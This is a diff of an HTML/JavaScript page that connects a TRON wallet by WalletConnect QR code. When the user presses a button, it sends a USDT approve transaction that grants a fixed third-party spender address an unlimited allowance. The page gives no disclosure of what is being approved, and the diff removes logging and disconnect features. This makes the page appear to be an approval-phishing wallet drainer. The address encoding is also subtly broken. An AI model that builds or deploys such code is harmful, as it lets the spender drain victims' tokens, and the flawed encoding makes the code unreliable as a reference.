@@ -3,217 +3,131 @@
 <head>
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width,initial-scale=1" />
-<title>TRON dApp - WalletConnect v2 Approve</title>
-
-<style>
-body { font-family: system-ui; margin:20px; }
-button { padding:8px 12px; margin-right:8px; }
-pre { background:#f4f4f4; padding:10px; white-space:pre-wrap; }
-#status { font-weight:bold; margin-bottom:10px; }
-canvas { margin-top:10px; }
-</style>
+<title>TRON WalletConnect QR First</title>
 
 <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.1/build/qrcode.min.js"></script>
 </head>
 
 <body>
 
-<h2>TRON WalletConnect v2 - Approve dApp</h2>
+<h2>QR → Connect → Sign Flow</h2>
 
-<div id="status">Idle</div>
-
-<button id="connectBtn">Connect</button>
+<button id="connectBtn">Generate QR</button>
 <button id="approveBtn" disabled>Send Approve</button>
-<button id="disconnectBtn" disabled>Disconnect</button>
 
 <div id="qr"></div>
-<pre id="log"></pre>
+<div id="status"></div>
 
 <script type="module">
 import SignClient from "https://unpkg.com/@walletconnect/sign-client@2.11.0/dist/index.es.js";
 
-/* ================= CONFIG ================= */
-
 const PROJECT_ID = "dde98880530be70b65d01a1be59e5fa3";
 
-const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+const USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 const SPENDER = "TN3ssBQjMsjsTyJkGL1hL7czsQjrjpePGu";
 
-const MAX_UINT256 =
+const MAX =
 "115792089237316195423570985008687907853269984665640564039457584007913129639935";
 
-/* ================= STATE ================= */
-
 let client;
-let session = null;
+let session;
+let pendingApproval;
 
-const logEl = document.getElementById("log");
-const statusEl = document.getElementById("status");
-
-function log(x){ logEl.textContent += x + "\n"; }
-function setStatus(x){ statusEl.textContent = x; }
-
-/* ================= INIT ================= */
-
+/* INIT */
 async function init(){
   client = await SignClient.init({
     projectId: PROJECT_ID,
     metadata: {
-      name: "TRON Approve dApp",
-      description: "WalletConnect v2 TRON approve flow",
+      name: "QR First dApp",
       url: "https://example.com"
     }
   });
-
-  log("Client ready");
-
-  client.on("session_delete", () => {
-    session = null;
-    setStatus("Disconnected");
-  });
-
-  restoreSession();
 }
 
-/* ================= SESSION RESTORE ================= */
+/* QR FIRST CONNECT */
+async function connectQR(){
 
-function saveSession(s){
-  localStorage.setItem("wc_session", JSON.stringify(s));
-}
+  document.getElementById("status").innerText = "Generating QR...";
 
-function getSession(){
-  try {
-    return JSON.parse(localStorage.getItem("wc_session"));
-  } catch {
-    return null;
-  }
-}
-
-function restoreSession(){
-  const saved = getSession();
-  if (saved) {
-    log("Session found in storage");
-  }
-}
-
-/* ================= QR ================= */
-
-async function showQR(uri){
-  const canvas = document.createElement("canvas");
-  await QRCode.toCanvas(canvas, uri, { width: 250 });
-
-  document.getElementById("qr").innerHTML = "";
-  document.getElementById("qr").appendChild(canvas);
-}
-
-/* ================= CONNECT ================= */
-
-async function connect(){
-  setStatus("Connecting...");
-
-  const { uri, approval } = await client.connect({
+  const result = await client.connect({
     requiredNamespaces: {
       tron: {
         methods: ["tron_sendTransaction"],
-        chains: ["tron:1"],
+        chains: ["tron:0"],
         events: []
       }
     }
   });
 
-  if (uri) {
-    await showQR(uri);
-    log("QR generated");
+  const uri = result.uri;
+  pendingApproval = result.approval;
+
+  if (!uri) {
+    document.getElementById("status").innerText =
+      "No QR needed (wallet already connected)";
+    session = await pendingApproval();
+    document.getElementById("approveBtn").disabled = false;
+    return;
   }
 
-  session = await approval();
+  const canvas = document.createElement("canvas");
+  await QRCode.toCanvas(canvas, uri, { width: 250 });
 
-  saveSession(session);
+  document.getElementById("qr").innerHTML = "";
+  document.getElementById("qr").appendChild(canvas);
 
-  log("Session approved: " + session.topic);
+  document.getElementById("status").innerText =
+    "Scan QR in Trust Wallet";
 
-  setStatus("Connected");
+  session = await pendingApproval();
+
+  document.getElementById("status").innerText =
+    "Connected → ready to sign";
 
   document.getElementById("approveBtn").disabled = false;
-  document.getElementById("disconnectBtn").disabled = false;
 }
 
-/* ================= TRON HELPERS ================= */
-
-function tronAddressToHex(addr){
-  return addr; // simplificat pentru demo (wallet decodează corect în practică)
-}
-
-/* ================= APPROVE TX ================= */
-
-function buildApproveData(){
+/* APPROVE BUILD */
+function buildApprove(){
   const methodId = "095ea7b3";
 
-  const spender = tronAddressToHex(SPENDER).replace("0x","");
-  const spenderPadded = spender.padStart(64,"0");
+  const spender = SPENDER.padStart(64,"0");
+  const amount = BigInt(MAX).toString(16).padStart(64,"0");
 
-  const amount = BigInt(MAX_UINT256).toString(16).padStart(64,"0");
-
-  return "0x" + methodId + spenderPadded + amount;
+  return "0x" + methodId + spender + amount;
 }
 
+/* SEND TX */
 async function sendApprove(){
-  if (!session) return;
-
-  setStatus("Sending approve... (wallet popup)");
 
   const owner = session.namespaces.tron.accounts[0].split(":")[2];
 
   const tx = {
-    to: USDT_CONTRACT,
+    to: USDT,
     owner_address: owner,
-    data: buildApproveData(),
+    data: buildApprove(),
     feeLimit: 10000000,
     callValue: 0
   };
 
-  try {
-    const res = await client.request({
-      topic: session.topic,
-      chainId: "tron:1",
-      request: {
-        method: "tron_sendTransaction",
-        params: [tx]
-      }
-    });
+  document.getElementById("status").innerText =
+    "Waiting wallet confirmation...";
 
-    log("TX sent: " + JSON.stringify(res));
-    setStatus("Approve confirmed / pending");
-
-  } catch (e) {
-    log("Rejected or error: " + e.message);
-    setStatus("Rejected");
-  }
-}
-
-/* ================= DISCONNECT ================= */
-
-async function disconnect(){
-  if (!session) return;
-
-  await client.disconnect({
+  await client.request({
     topic: session.topic,
-    reason: { code: 6000, message: "User disconnect" }
+    chainId: "tron:0",
+    request: {
+      method: "tron_sendTransaction",
+      params: [tx]
+    }
   });
 
-  session = null;
-  localStorage.removeItem("wc_session");
-
-  setStatus("Disconnected");
+  document.getElementById("status").innerText =
+    "Sent / signed in wallet UI";
 }
 
-/* ================= UI ================= */
-
-document.getElementById("connectBtn").onclick = connect;
+document.getElementById("connectBtn").onclick = connectQR;
 document.getElementById("approveBtn").onclick = sendApprove;
-document.getElementById("disconnectBtn").onclick = disconnect;
-
-/* ================= BOOT ================= */
 
 init();
 </script>
